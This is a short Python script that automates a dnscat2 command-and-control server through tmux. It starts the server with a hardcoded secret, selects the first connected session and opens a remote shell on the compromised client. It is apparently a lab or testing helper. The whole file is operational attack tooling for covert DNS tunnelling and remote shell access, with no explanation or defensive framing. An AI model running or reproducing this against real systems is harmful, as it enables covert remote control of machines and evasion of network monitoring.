import subprocess
import os 
import time

os.chdir("/home/ssh_user/dns/server")

session_name = "dns_session_server"
# Start a new tmux session
subprocess.run(f"tmux new-session -d -s {session_name}", shell=True)
time.sleep(1)  # Wait for tmux session to initialize

# Send the command to start dnscat2
cmd = 'sleep 3'
subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)

cmd = "ruby dnscat2.rb --secret=abc"
subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)

cmd = 'sleep 3'
subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)


cmd = "session -i 1"
subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)

cmd = "shell"
# session -i 2
subprocess.run(f'tmux send-keys -t {session_name} "{cmd}" Enter', shell=True)

cmd = "ls"

# Attach to the tmux session
subprocess.run(f"tmux attach -t {session_name}", shell=True)

# weird session managemtn retry